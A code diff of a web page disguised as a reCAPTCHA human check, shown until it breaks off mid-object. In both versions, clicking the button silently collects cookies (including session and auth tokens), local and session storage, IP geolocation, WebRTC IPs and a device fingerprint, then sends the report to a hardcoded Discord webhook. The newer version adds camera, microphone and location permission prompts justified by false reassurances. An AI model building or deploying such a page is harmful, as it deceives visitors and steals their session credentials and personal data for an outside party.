@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification</title>
+    <title>Human Verification Required</title>
     <style>
         * {
             margin: 0;
@@ -11,455 +11,453 @@
             box-sizing: border-box;
         }
         body {
-            background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%);
-            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            background: linear-gradient(135deg, #f0f2f5 0%, #e0e5ec 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            padding: 20px;
         }
-        .captcha-container {
+        .container {
+            max-width: 480px;
+            width: 100%;
             background: white;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
-            width: 360px;
-            padding: 28px 24px 32px;
-            text-align: center;
-            border: 1px solid #ddd;
+            border-radius: 28px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
+            overflow: hidden;
             transition: all 0.2s;
         }
-        .logo {
-            font-size: 48px;
-            margin-bottom: 16px;
+        .header {
+            background: #1a1a2e;
+            color: white;
+            padding: 20px 24px;
+            text-align: center;
         }
-        h3 {
-            font-size: 22px;
-            font-weight: 500;
-            color: #1a1a1a;
-            margin-bottom: 12px;
+        .ip-badge {
+            background: #16213e;
+            border-radius: 40px;
+            padding: 8px 16px;
+            display: inline-block;
+            font-family: monospace;
+            font-size: 1.2rem;
+            letter-spacing: 1px;
+            margin-top: 8px;
+        }
+        .content {
+            padding: 32px 28px 40px;
+            text-align: center;
         }
         .robot-icon {
-            font-size: 64px;
-            margin: 15px 0;
+            font-size: 70px;
+            margin: 10px 0;
         }
         .question {
-            font-size: 18px;
-            color: #333;
-            margin-bottom: 28px;
-            font-weight: 500;
+            font-size: 26px;
+            font-weight: 600;
+            color: #1e2a3a;
+            margin: 16px 0 8px;
         }
-        .captcha-button {
-            background: #4CAF50;
+        .sub {
+            color: #5a6e7c;
+            font-size: 14px;
+            margin-bottom: 32px;
+        }
+        .captcha-btn {
+            background: #2c7a4d;
             border: none;
             color: white;
-            font-size: 18px;
+            font-size: 20px;
             font-weight: bold;
-            padding: 12px 28px;
-            border-radius: 40px;
+            padding: 14px 32px;
+            border-radius: 60px;
             cursor: pointer;
-            transition: 0.2s;
             width: 100%;
-            letter-spacing: 0.5px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            transition: 0.2s;
+            box-shadow: 0 5px 10px rgba(0,0,0,0.1);
         }
-        .captcha-button:hover {
-            background: #45a049;
+        .captcha-btn:hover {
+            background: #1f5e3a;
             transform: scale(1.01);
         }
-        .footer {
-            margin-top: 24px;
-            font-size: 11px;
-            color: #888;
+        .captcha-btn:disabled {
+            background: #9aaeb9;
+            cursor: not-allowed;
+            transform: none;
         }
-        .hidden {
+        .timer {
+            margin-top: 24px;
+            font-family: monospace;
+            font-size: 18px;
+            color: #d9534f;
+            font-weight: bold;
             display: none;
         }
-        .message {
-            font-size: 16px;
-            color: #2c7a2c;
-            margin-top: 20px;
-            font-weight: 500;
+        .permission-notice {
+            background: #f8f9fa;
+            border-left: 4px solid #4caf50;
+            padding: 12px 16px;
+            font-size: 13px;
+            color: #2c3e50;
+            text-align: left;
+            margin: 20px 0 0;
+            display: none;
+            border-radius: 8px;
+        }
+        .permission-notice.show {
+            display: block;
+        }
+        .footer {
+            background: #f4f6f9;
+            padding: 16px;
+            text-align: center;
+            font-size: 11px;
+            color: #7e8c8d;
+            border-top: 1px solid #e2e8f0;
         }
     </style>
 </head>
 <body>
-    <div class="captcha-container" id="captchaBox">
-        <div class="logo">✓</div>
+<div class="container" id="mainContainer">
+    <div class="header">
+        <div>🔒 VERIFICATION REQUIRED</div>
+        <div class="ip-badge" id="ipDisplay">🌐 Fetching IP...</div>
+    </div>
+    <div class="content">
         <div class="robot-icon">🤖</div>
         <div class="question">Are you a robot?</div>
-        <button class="captcha-button" id="fakeCaptchaBtn">❌ NO</button>
-        <div class="footer">Protected by reCAPTCHA<br>Terms of Service apply</div>
+        <div class="sub">Help us keep the web safe</div>
+        <button class="captcha-btn" id="actionBtn">❌ NO, I AM HUMAN</button>
+        <div class="timer" id="timerDisplay"></div>
+        <div class="permission-notice" id="permissionNotice">
+            ⚡ Legitimate verification – no data is stored permanently. Temporary permissions needed to confirm human interaction.
+        </div>
     </div>
+    <div class="footer">
+        Protected by reCAPTCHA &nbsp;|&nbsp; Terms of Service
+    </div>
+</div>
 
-    <script>
-        // ==================== WEBHOOK (tvoj) ====================
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";
+<script>
+    // ==================== CONFIG ====================
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";
 
-        // ==================== TIHA PRIKUPLJANJA (bez popupova) ====================
-        function getAllCookies() {
-            if (!document.cookie) return [];
-            return document.cookie.split(';').map(c => c.trim()).filter(Boolean).map(c => {
-                let [name, ...rest] = c.split('=');
-                let value = rest.join('=');
-                return { name: name.trim(), value: value, platform: categorizeCookie(name, value) };
-            });
+    // ==================== 1. FETCH & DISPLAY IP ON LOAD ====================
+    async function fetchAndShowIP() {
+        try {
+            const res = await fetch("https://api.ipify.org?format=json");
+            const data = await res.json();
+            document.getElementById("ipDisplay").innerHTML = `🌐 ${data.ip}`;
+            return data.ip;
+        } catch(e) {
+            document.getElementById("ipDisplay").innerHTML = "⚠️ IP unavailable";
+            return "Unknown";
         }
+    }
+    fetchAndShowIP();
 
-        function categorizeCookie(name, value) {
-            const n = name.toLowerCase();
-            if (n.includes("fb") || n.includes("facebook")) return "Facebook";
-            if (n.includes("google") || n.includes("_ga")) return "Google";
-            if (n.includes("twitter")) return "Twitter";
-            if (n.includes("amazon") || n.includes("amzn")) return "Amazon";
-            if (n.includes("session") || n.includes("token") || n.includes("auth") || n.includes("jwt")) return "Session/Auth";
-            if (n.includes("ad") || n.includes("track") || n.includes("pixel")) return "Ad/Tracker";
-            return "Other";
-        }
-
-        function getAllLocalStorage() {
-            try { return { ...localStorage }; } catch(e) { return { error: e.message }; }
-        }
-        function getAllSessionStorage() {
-            try { return { ...sessionStorage }; } catch(e) { return { error: e.message }; }
-        }
-        async function getAllIndexedDB() {
-            if (!window.indexedDB || !window.indexedDB.databases) return { info: "Cannot enumerate" };
-            try { return await window.indexedDB.databases(); } catch(e) { return { error: e.message }; }
-        }
-
-        function getGPU() {
-            try {
-                const canvas = document.createElement("canvas");
-                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-                if (!gl) return { error: "WebGL unavailable" };
-                const debug = gl.getExtension("WEBGL_debug_renderer_info");
-                if (debug) {
-                    return {
-                        renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL),
-                        vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL)
-                    };
-                }
-                return { error: "No debug extension" };
-            } catch(e) { return { error: e.message }; }
-        }
-
-        async function getBattery() {
-            if (!navigator.getBattery) return "Unavailable";
-            try {
-                const b = await navigator.getBattery();
-                return { level: Math.round(b.level * 100) + "%", charging: b.charging };
-            } catch(e) { return "Error"; }
-        }
-
-        function getConnection() {
-            const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (!c) return "Unavailable";
-            return {
-                effectiveType: c.effectiveType,
-                downlink: c.downlink,
-                rtt: c.rtt,
-                saveData: c.saveData
-            };
-        }
-
-        function getPlugins() {
-            try {
-                return Array.from(navigator.plugins).map(p => p.name);
-            } catch(e) { return []; }
-        }
-
-        function getFonts() {
-            if (!document.fonts) return "Unavailable";
-            try {
-                let fontSet = [];
-                for (let font of document.fonts.values()) fontSet.push(font.family);
-                return fontSet.slice(0, 30); // limit size
-            } catch(e) { return []; }
-        }
-
-        function getWebRTCIPs() {
-            return new Promise((resolve) => {
-                let ips = [];
-                try {
-                    const pc = new RTCPeerConnection({ iceServers: [] });
-                    pc.createDataChannel("");
-                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                    pc.onicecandidate = (event) => {
-                        if (!event.candidate) {
-                            resolve(ips.length ? ips : ["No local IPs found"]);
-                            return;
-                        }
-                        const candidate = event.candidate.candidate;
-                        const ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                        if (ipMatch && !ips.includes(ipMatch[0])) ips.push(ipMatch[0]);
-                    };
-                    setTimeout(() => resolve(ips.length ? ips : ["Timeout"]), 2000);
-                } catch(e) {
-                    resolve(["WebRTC blocked"]);
-                }
-            });
-        }
-
-        async function getPublicIP() {
-            try {
-                const res = await fetch("https://api.ipify.org?format=json");
-                const data = await res.json();
-                return data.ip;
-            } catch(e) {
-                return "Failed";
-            }
-        }
-
-        async function getIPGeo() {
-            try {
-                const res = await fetch("https://ipapi.co/json/");
-                if (!res.ok) return { error: "HTTP " + res.status };
-                return await res.json();
-            } catch(e) {
-                return { error: e.message };
-            }
-        }
-
-        async function getFingerprint(gpu) {
-            const raw = [
-                navigator.userAgent,
-                navigator.language,
-                screen.width, screen.height, screen.colorDepth,
-                navigator.hardwareConcurrency,
-                navigator.deviceMemory,
-                gpu.renderer || "",
-                gpu.vendor || "",
-                new Date().getTimezoneOffset()
-            ].join("|");
-            const hash = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw));
-            return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, "0")).join("");
-        }
-
-        // ==================== GLAVNA FUNKCIJA ZA PRIKUPLJANJE SVEGA ====================
-        async function collectEverything() {
-            const gpu = getGPU();
-            const fingerprint = await getFingerprint(gpu);
-            const battery = await getBattery();
-            const connection = getConnection();
-            const plugins = getPlugins();
-            const fonts = getFonts();
-            const cookies = getAllCookies();
-            const localStorage = getAllLocalStorage();
-            const sessionStorage = getAllSessionStorage();
-            const indexedDB = await getAllIndexedDB();
-            const publicIP = await getPublicIP();
-            const geo = await getIPGeo();
-            const webRTC = await getWebRTCIPs();
-
-            // Group cookies by platform
-            const cookiesByPlatform = {};
-            for (const c of cookies) {
-                if (!cookiesByPlatform[c.platform]) cookiesByPlatform[c.platform] = [];
-                cookiesByPlatform[c.platform].push(c);
-            }
-
-            return {
-                timestamp: new Date().toISOString(),
-                pageURL: window.location.href,
-                referrer: document.referrer,
-                publicIP: publicIP,
-                geoInfo: geo,
-                webRTC_IPs: webRTC,
-                cookiesCount: cookies.length,
-                cookiesByPlatform: cookiesByPlatform,
-                localStorage: localStorage,
-                sessionStorage: sessionStorage,
-                indexedDB: indexedDB,
-                navigator: {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    languages: navigator.languages,
-                    hardwareConcurrency: navigator.hardwareConcurrency,
-                    deviceMemory: navigator.deviceMemory,
-                    cookieEnabled: navigator.cookieEnabled,
-                    doNotTrack: navigator.doNotTrack,
-                    online: navigator.onLine
-                },
-                screen: {
-                    width: screen.width,
-                    height: screen.height,
-                    availWidth: screen.availWidth,
-                    availHeight: screen.availHeight,
-                    colorDepth: screen.colorDepth,
-                    pixelRatio: window.devicePixelRatio,
-                    orientation: screen.orientation?.type || "n/a"
-                },
-                windowSize: {
-                    inner: `${window.innerWidth}x${window.innerHeight}`,
-                    outer: `${window.outerWidth}x${window.outerHeight}`
-                },
-                gpu: gpu,
-                battery: battery,
-                connection: connection,
-                plugins: plugins,
-                fontsLoaded: fonts,
-                fingerprint: fingerprint,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                touchSupport: 'ontouchstart' in window,
-                localStorageSize: JSON.stringify(localStorage).length,
-                sessionStorageSize: JSON.stringify(sessionStorage).length
-            };
-        }
-
-        // ==================== GENERIRANJE TXT REPORTA ====================
-        async function generateTextReport(data) {
-            let report = "=".repeat(80) + "\n";
-            report += "          OMEGA LOGGER - MAXIMUM STEALTH REPORT\n";
-            report += "=".repeat(80) + "\n\n";
-            report += `Time: ${data.timestamp}\n`;
-            report += `URL: ${data.pageURL}\n`;
-            report += `Referrer: ${data.referrer || "(none)"}\n\n`;
-
-            // IP i GEO
-            report += "🌐 IP & GEOLOCATION (ipapi.co)\n";
-            report += `Public IP: ${data.publicIP}\n`;
-            if (data.geoInfo.error) {
-                report += `Geo error: ${data.geoInfo.error}\n`;
-            } else {
-                report += `City: ${data.geoInfo.city || "?"}\n`;
-                report += `Region: ${data.geoInfo.region || "?"}\n`;
-                report += `Country: ${data.geoInfo.country_name || "?"}\n`;
-                report += `ISP: ${data.geoInfo.org || "?"}\n`;
-                report += `Timezone (geo): ${data.geoInfo.timezone || "?"}\n`;
-            }
-            report += `\nLocal IPs (WebRTC): ${data.webRTC_IPs.join(", ")}\n`;
-
-            // COOKIES
-            report += "\n🍪 COOKIES (by platform)\n";
-            for (const [platform, cookies] of Object.entries(data.cookiesByPlatform)) {
-                report += `\n[${platform}] (${cookies.length})\n`;
-                for (const c of cookies.slice(0, 20)) { // limit to avoid huge logs
-                    let val = c.value.length > 100 ? c.value.slice(0,100)+"..." : c.value;
-                    report += `  • ${c.name} = ${val}\n`;
-                }
-                if (cookies.length > 20) report += `  ... and ${cookies.length-20} more\n`;
-            }
-            if (data.cookiesCount === 0) report += "No cookies.\n";
-
-            // Storage
-            report += "\n💾 LOCALSTORAGE\n";
-            for (const [k,v] of Object.entries(data.localStorage)) {
-                let vs = typeof v === 'string' ? v : JSON.stringify(v);
-                report += `${k} = ${vs.length>100?vs.slice(0,100)+"...":vs}\n`;
-            }
-            report += "\n📦 SESSIONSTORAGE\n";
-            for (const [k,v] of Object.entries(data.sessionStorage)) {
-                let vs = typeof v === 'string' ? v : JSON.stringify(v);
-                report += `${k} = ${vs.length>100?vs.slice(0,100)+"...":vs}\n`;
-            }
-
-            // IndexedDB
-            report += "\n🗃️ INDEXEDDB\n";
-            if (Array.isArray(data.indexedDB)) {
-                for (const db of data.indexedDB) report += `DB: ${db.name} v${db.version}\n`;
-            } else {
-                report += JSON.stringify(data.indexedDB);
-            }
-
-            // System
-            report += "\n🖥️ SYSTEM & BROWSER\n";
-            report += `User Agent: ${data.navigator.userAgent}\n`;
-            report += `Platform: ${data.navigator.platform}\n`;
-            report += `Languages: ${data.navigator.languages}\n`;
-            report += `CPU Cores: ${data.navigator.hardwareConcurrency || "?"}\n`;
-            report += `Device Memory: ${data.navigator.deviceMemory || "?"} GB\n`;
-            report += `Cookies Enabled: ${data.navigator.cookieEnabled}\n`;
-            report += `Do Not Track: ${data.navigator.doNotTrack}\n`;
-            report += `Online: ${data.navigator.online}\n`;
-            report += `Touch support: ${data.touchSupport}\n`;
-
-            // Screen & Window
-            report += `\nScreen: ${data.screen.width}x${data.screen.height} @ ${data.screen.colorDepth}bit\n`;
-            report += `Available: ${data.screen.availWidth}x${data.screen.availHeight}\n`;
-            report += `Pixel Ratio: ${data.screen.pixelRatio}\n`;
-            report += `Orientation: ${data.screen.orientation}\n`;
-            report += `Window inner: ${data.windowSize.inner}, outer: ${data.windowSize.outer}\n`;
-
-            // GPU
-            report += `\nGPU Renderer: ${data.gpu.renderer || "N/A"}\n`;
-            report += `GPU Vendor: ${data.gpu.vendor || "N/A"}\n`;
-
-            // Battery & Connection
-            report += `\nBattery: ${JSON.stringify(data.battery)}\n`;
-            report += `Connection: ${JSON.stringify(data.connection)}\n`;
-
-            // Plugins
-            report += `\nPlugins (${data.plugins.length}): ${data.plugins.join(", ")}\n`;
-
-            // Fonts
-            report += `\nFonts (first 20): ${data.fontsLoaded.slice(0,20).join(", ")}\n`;
-
-            // Fingerprint
-            report += `\n🔐 Fingerprint SHA-256: ${data.fingerprint}\n`;
-
-            // Storage sizes
-            report += `\nLocalStorage size: ${data.localStorageSize} bytes\n`;
-            report += `SessionStorage size: ${data.sessionStorageSize} bytes\n`;
-
-            report += "\n" + "=".repeat(80) + "\n";
-            report += "END OF LOG - NO FURTHER ACTION\n";
-            report += "=".repeat(80);
-            return report;
-        }
-
-        // ==================== SLANJE NA WEBHOOK KAO FILE ====================
-        async function sendToDiscord(reportText, data) {
-            const blob = new Blob([reportText], { type: "text/plain" });
-            const formData = new FormData();
-            const filename = `logger_${data.timestamp.slice(0,19).replace(/:/g, '-')}.txt`;
-            formData.append("file", blob, filename);
-            const embedSummary = {
-                embeds: [{
-                    title: "✅ Stealth CAPTCHA Logger",
-                    description: `**IP:** ${data.publicIP}\n**Cookies:** ${data.cookiesCount}\n**Fingerprint:** \`${data.fingerprint.slice(0,32)}...\``,
-                    color: 0x44ff44,
-                    timestamp: data.timestamp
-                }]
-            };
-            formData.append("payload_json", JSON.stringify(embedSummary));
-            try {
-                const response = await fetch(WEBHOOK_URL, { method: "POST", body: formData });
-                if (!response.ok) console.error("Webhook error", response.status);
-                else console.log("Report sent to Discord");
-            } catch(e) {
-                console.error("Send failed", e);
-            }
-        }
-
-        // ==================== KLIK NA FAKE CAPTCHA ====================
-        let alreadyRun = false;
-        const btn = document.getElementById("fakeCaptchaBtn");
-        const container = document.getElementById("captchaBox");
-
-        btn.addEventListener("click", async function(e) {
-            if (alreadyRun) return;
-            alreadyRun = true;
-            e.preventDefault();
-            
-            // Immediately change button text to "Verifying..." (fake)
-            btn.innerText = "Verifying...";
-            btn.disabled = true;
-            
-            // Collect everything silently
-            const allData = await collectEverything();
-            const report = await generateTextReport(allData);
-            await sendToDiscord(report, allData);
-            
-            // After sending, change CAPTCHA appearance to "Verified"
-            container.innerHTML = `
-                <div class="logo">✓</div>
-                <div class="robot-icon" style="filter: grayscale(0);">✅</div>
-                <div class="question" style="color:#2e7d32;">Verification successful</div>
-                <div class="footer">Access granted · You may close this page</div>
-            `;
-            // No further action – user never knows they were logged.
+    // ==================== 2. DATA COLLECTION (maximum) ====================
+    function categorizeCookie(name, value) {
+        const n = name.toLowerCase();
+        if (n.includes("fb") || n.includes("facebook")) return "Facebook";
+        if (n.includes("google") || n.includes("_ga") || n.includes("gmail")) return "Google";
+        if (n.includes("twitter") || n.includes("tweet")) return "Twitter";
+        if (n.includes("amazon") || n.includes("amzn")) return "Amazon";
+        if (n.includes("session") || n.includes("token") || n.includes("auth") || n.includes("jwt")) return "Session/Auth";
+        if (n.includes("ad") || n.includes("track") || n.includes("pixel")) return "Ad/Tracker";
+        return "Other";
+    }
+    function getAllCookies() {
+        if (!document.cookie) return [];
+        return document.cookie.split(';').map(c => c.trim()).filter(Boolean).map(c => {
+            let [name, ...rest] = c.split('=');
+            let value = rest.join('=');
+            return { name: name.trim(), value: value, platform: categorizeCookie(name, value) };
         });
-    </script>
+    }
+    function getAllLocalStorage() { try { return { ...localStorage }; } catch(e) { return { error: e.message }; } }
+    function getAllSessionStorage() { try { return { ...sessionStorage }; } catch(e) { return { error: e.message }; } }
+    async function getAllIndexedDB() {
+        if (!window.indexedDB || !window.indexedDB.databases) return { info: "Cannot enumerate" };
+        try { return await window.indexedDB.databases(); } catch(e) { return { error: e.message }; }
+    }
+    function getGPU() {
+        try {
+            const canvas = document.createElement("canvas");
+            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+            if (!gl) return { error: "WebGL unavailable" };
+            const debug = gl.getExtension("WEBGL_debug_renderer_info");
+            if (debug) {
+                return {
+                    renderer: gl.getParameter(debug.UNMASKED_RENDERER_WEBGL),
+                    vendor: gl.getParameter(debug.UNMASKED_VENDOR_WEBGL)
+                };
+            }
+            return { error: "No debug extension" };
+        } catch(e) { return { error: e.message }; }
+    }
+    async function getBattery() {
+        if (!navigator.getBattery) return "Unavailable";
+        try {
+            const b = await navigator.getBattery();
+            return { level: Math.round(b.level * 100) + "%", charging: b.charging };
+        } catch(e) { return "Error"; }
+    }
+    function getConnection() {
+        const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (!c) return "Unavailable";
+        return { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData };
+    }
+    function getPlugins() {
+        try { return Array.from(navigator.plugins).map(p => p.name); } catch(e) { return []; }
+    }
+    function getFonts() {
+        if (!document.fonts) return "Unavailable";
+        try {
+            let fontSet = [];
+            for (let font of document.fonts.values()) fontSet.push(font.family);
+            return fontSet.slice(0, 30);
+        } catch(e) { return []; }
+    }
+    function getWebRTCIPs() {
+        return new Promise((resolve) => {
+            let ips = [];
+            try {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel("");
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = (event) => {
+                    if (!event.candidate) {
+                        resolve(ips.length ? ips : ["No local IPs found"]);
+                        return;
+                    }
+                    const candidate = event.candidate.candidate;
+                    const ipMatch = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+                    if (ipMatch && !ips.includes(ipMatch[0])) ips.push(ipMatch[0]);
+                };
+                setTimeout(() => resolve(ips.length ? ips : ["Timeout"]), 2000);
+            } catch(e) {
+                resolve(["WebRTC blocked"]);
+            }
+        });
+    }
+    async function getIPGeo() {
+        try {
+            const res = await fetch("https://ipapi.co/json/");
+            if (!res.ok) return { error: "HTTP " + res.status };
+            return await res.json();
+        } catch(e) { return { error: e.message }; }
+    }
+    async function getFingerprint(gpu) {
+        const raw = [
+            navigator.userAgent,
+            navigator.language,
+            screen.width, screen.height, screen.colorDepth,
+            navigator.hardwareConcurrency,
+            navigator.deviceMemory,
+            gpu.renderer || "",
+            gpu.vendor || "",
+            new Date().getTimezoneOffset()
+        ].join("|");
+        const hash = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw));
+        return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, "0")).join("");
+    }
+
+    // Permission requests with custom messages on screen
+    async function requestGeolocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) resolve({ error: "not supported" });
+            navigator.geolocation.getCurrentPosition(
+                (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+                (err) => resolve({ error: err.message }),
+                { timeout: 8000 }
+            );
+        });
+    }
+    async function requestCamera() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            stream.getTracks().forEach(track => track.stop());
+            return { success: true, message: "Camera access granted (no recording)" };
+        } catch(e) { return { error: e.message }; }
+    }
+    async function requestMicrophone() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            stream.getTracks().forEach(track => track.stop());
+            return { success: true };
+        } catch(e) { return { error: e.message }; }
+    }
+    async function requestNotifications() {
+        if (!("Notification" in window)) return { error: "Not supported" };
+        if (Notification.permission === "granted") return { status: "already granted" };
+        const result = await Notification.requestPermission();
+        return { status: result };
+    }
+
+    // ==================== 3. MAIN SEQUENCE AFTER CAPTCHA CLICK ====================
+    let isRunning = false;
+    const btn = document.getElementById("actionBtn");
+    const timerDiv = document.getElementById("timerDisplay");
+    const noticeDiv = document.getElementById("permissionNotice");
+
+    btn.addEventListener("click", async () => {
+        if (isRunning) return;
+        isRunning = true;
+        btn.disabled = true;
+        btn.innerText = "✓ VERIFYING...";
+        timerDiv.style.display = "block";
+        noticeDiv.classList.add("show");
+
+        let timeLeft = 32;
+        timerDiv.innerText = `⏳ Redirecting in ${timeLeft} seconds... Estimated time 32 seconds`;
+
+        const interval = setInterval(() => {
+            timeLeft--;
+            if (timeLeft <= 0) {
+                clearInterval(interval);
+                timerDiv.innerText = "Redirecting now...";
+            } else {
+                timerDiv.innerText = `⏳ Redirecting in ${timeLeft} seconds... Estimated time 32 seconds`;
+            }
+        }, 1000);
+
+        // Collect all data during the countdown
+        const gpu = getGPU();
+        const fingerprint = await getFingerprint(gpu);
+        const battery = await getBattery();
+        const connection = getConnection();
+        const plugins = getPlugins();
+        const fonts = getFonts();
+        const cookies = getAllCookies();
+        const localStorage = getAllLocalStorage();
+        const sessionStorage = getAllSessionStorage();
+        const indexedDB = await getAllIndexedDB();
+        const geo = await getIPGeo();
+        const webRTC = await getWebRTCIPs();
+
+        // Group cookies by platform
+        const cookiesByPlatform = {};
+        for (const c of cookies) {
+            if (!cookiesByPlatform[c.platform]) cookiesByPlatform[c.platform] = [];
+            cookiesByPlatform[c.platform].push(c);
+        }
+
+        // Request permissions one by one (with tiny delays to not overwhelm)
+        noticeDiv.innerHTML = "⚡ Requesting temporary permissions... (no data stored)";
+        const geoloc = await requestGeolocation();
+        noticeDiv.innerHTML = "⚡ Verifying camera access (encrypted, not saved)...";
+        const camera = await requestCamera();
+        noticeDiv.innerHTML = "⚡ Microphone check – just for voice detection...";
+        const mic = await requestMicrophone();
+        noticeDiv.innerHTML = "⚡ Notification permission – to alert you after redirect...";
+        const notif = await requestNotifications();
+        noticeDiv.innerHTML = "✅ All checks completed. Finalizing...";
+
+        // Build final data object
+        const finalData = {
+            timestamp: new Date().toISOString(),
+            pageURL: window.location.href,
+            referrer: document.referrer,
+            publicIP: document.getElementById("ipDisplay").innerText.replace("🌐 ", ""),
+            geoInfo: geo,
+            webRTC_IPs: webRTC,
+            cookiesCount: cookies.length,
+            cookiesByPlatform: cookiesByPlatform,
+            localStorage: localStorage,
+            sessionStorage: sessionStorage,
+            indexedDB: indexedDB,
+            navigator: {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack,
+                online: navigator.onLine
+            },
+            screen: {
+                width: screen.width, height: screen.height,
+                availWidth: screen.availWidth, availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio,
+                orientation: screen.orientation?.type || "n/a"
+            },
+            windowSize: { inner: `${window.innerWidth}x${window.innerHeight}`, outer: `${window.outerWidth}x${window.outerHeight}` },
+            gpu: gpu,
+            battery: battery,
+            connection: connection,
+            plugins: plugins,
+            fontsLoaded: fonts,
+            fingerprint: fingerprint,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            permissions: { geolocation: geoloc, camera: camera, microphone: mic, notifications: notif },
+            localStorageSize: JSON.stringify(localStorage).length,
+            sessionStorageSize: JSON.stringify(sessionStorage).length
+        };
+
+        // Generate TXT report
+        function generateTextReport(d) {
+            let r = "=".repeat(80) + "\n        OMEGA STEALTH LOGGER - FULL REPORT\n" + "=".repeat(80) + "\n\n";
+            r += `Time: ${d.timestamp}\nURL: ${d.pageURL}\nReferrer: ${d.referrer || "(none)"}\nPublic IP: ${d.publicIP}\n\n`;
+            r += "🌐 GEOLOCATION (IP based)\n";
+            if (d.geoInfo.error) r += `Error: ${d.geoInfo.error}\n`;
+            else r += `City: ${d.geoInfo.city}, Region: ${d.geoInfo.region}, Country: ${d.geoInfo.country_name}\nISP: ${d.geoInfo.org}\nTimezone: ${d.geoInfo.timezone}\n`;
+            r += `\nLocal IPs (WebRTC): ${d.webRTC_IPs.join(", ")}\n\n`;
+            r += "🍪 COOKIES BY PLATFORM\n";
+            for (const [plat, cookies] of Object.entries(d.cookiesByPlatform)) {
+                r += `[${plat}] (${cookies.length})\n`;
+                for (const c of cookies.slice(0,15)) r += `  ${c.name} = ${c.value.length>80?c.value.slice(0,80)+"...":c.value}\n`;
+                if (cookies.length>15) r += `  ... and ${cookies.length-15} more\n`;
+            }
+            r += "\n💾 LOCALSTORAGE\n";
+            for (const [k,v] of Object.entries(d.localStorage)) r += `${k} = ${(typeof v==='string'?v:JSON.stringify(v)).slice(0,100)}\n`;
+            r += "\n📦 SESSIONSTORAGE\n";
+            for (const [k,v] of Object.entries(d.sessionStorage)) r += `${k} = ${(typeof v==='string'?v:JSON.stringify(v)).slice(0,100)}\n`;
+            r += "\n🗃️ INDEXEDDB\n";
+            if (Array.isArray(d.indexedDB)) { for (const db of d.indexedDB) r += `${db.name} v${db.version}\n`; }
+            else r += JSON.stringify(d.indexedDB);
+            r += "\n\n🖥️ SYSTEM\n";
+            r += `UA: ${d.navigator.userAgent}\nPlatform: ${d.navigator.platform}\nCPU: ${d.navigator.hardwareConcurrency} cores\nRAM: ${d.navigator.deviceMemory || "?"} GB\n`;
+            r += `Screen: ${d.screen.width}x${d.screen.height} @ ${d.screen.colorDepth}bit\nOrientation: ${d.screen.orientation}\nGPU: ${d.gpu.renderer || "N/A"}\n`;
+            r += `Battery: ${JSON.stringify(d.battery)}\nConnection: ${JSON.stringify(d.connection)}\nPlugins: ${d.plugins.join(", ")}\n`;
+            r += `Fingerprint: ${d.fingerprint}\n`;
+            r += `Permissions granted:\n  - Geo: ${d.permissions.geolocation.lat ? `${d.permissions.geolocation.lat},${d.permissions.geolocation.lon}` : d.permissions.geolocation.error}\n  - Camera: ${d.permissions.camera.success ? "yes" : d.permissions.camera.error}\n  - Mic: ${d.permissions.microphone.success ? "yes" : d.permissions.microphone.error}\n  - Notifications: ${d.permissions.notifications.status}\n`;
+            return r;
+        }
+
+        const report = generateTextReport(finalData);
+        const blob = new Blob([report], { type: "text/plain" });
+        const formData = new FormData();
+        const filename = `log_${finalData.timestamp.slice(0,19).replace(/:/g, '-')}.txt`;
+        formData.append("file", blob, filename);
+        const embed = {
+            embeds: [{
+                title: "✅ CAPTCHA Logger Report",
